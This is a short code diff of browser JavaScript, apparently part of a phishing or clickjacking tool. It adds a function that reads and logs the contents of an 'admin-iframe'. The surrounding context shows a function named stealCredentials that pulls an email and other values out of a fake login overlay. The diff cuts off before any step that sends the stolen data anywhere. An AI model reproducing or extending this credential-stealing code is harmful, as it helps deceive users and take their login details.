@@ -1,3 +1,19 @@
+function inspectIframe() {
+    const iframe = document.getElementById('admin-iframe');
+    try {
+        const iframeDoc = iframe.contentWindow.document;
+        console.log('Iframe Title:', iframeDoc.title);
+        console.log('Iframe Body:', iframeDoc.body.innerHTML);
+    } catch (e) {
+        console.error('Cannot access iframe contents:', e);
+    }
+}
+
+// Run after iframe loads
+document.getElementById('admin-iframe').addEventListener('load', inspectIframe);
+
+
+
 // Function to steal credentials from the overlay
 function stealCredentials() {
     const email = document.getElementById('fake-email').value;
@@ -31,3 +47,5 @@ fetch('/', { method: 'HEAD' }) // HEAD to avoid reloading the page
         }
     })
     .catch(error => console.error('Fetch failed:', error));
+
+
